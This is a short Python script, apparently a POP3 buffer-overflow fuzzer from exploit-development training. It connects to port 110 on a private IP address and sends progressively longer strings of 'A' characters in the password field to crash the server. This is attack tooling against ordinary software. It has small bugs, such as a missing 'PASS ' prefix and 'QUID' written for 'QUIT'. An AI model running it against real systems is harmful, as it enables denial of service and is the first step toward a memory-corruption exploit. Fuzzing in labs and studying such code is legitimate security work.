#!/usr/bin/python

# imports
import socket

# vars
buffer=["A"]
counter=100

addr_ip='192.168.50.74'
addr_port=110

uname='USER'
pword='PASS'

# loop through buffer++ X times incrementing the buffer size
while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter=counter+200


for bytes in buffer:
	print "-----------------------------------------------------------------------------------------------------------"

	# connect sock
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect((addr_ip, addr_port))
	print "[*] Opened new connection to: %s" % str(addr_ip)

	# recv init banner
	banner = s.recv(1024)
	print "[RCV] Recieved connection banner: %s" % str(banner)

	# send username
	print "[SEND] Sending username: %s" % str(uname)
	s.send('USER ' + uname + '\r\n') 

	# recv uname response
        resp = s.recv(1024)
	print "[RCV] Recieved response: %s" % str(resp)

	# send password + payload
	print "[SEND] sending password + %s bytes of fuzz" % len(bytes)
	s.send(pword  + bytes + '\r\n')

	# recive response from pass + payload
	resp2 = s.recv(1024)
	print  "[RCV] Recieved reponse: %s" % str(resp2)

	s.send('QUID\r\n')

	print "----------------------------------------------------------------------------------------------------------"


s.close()
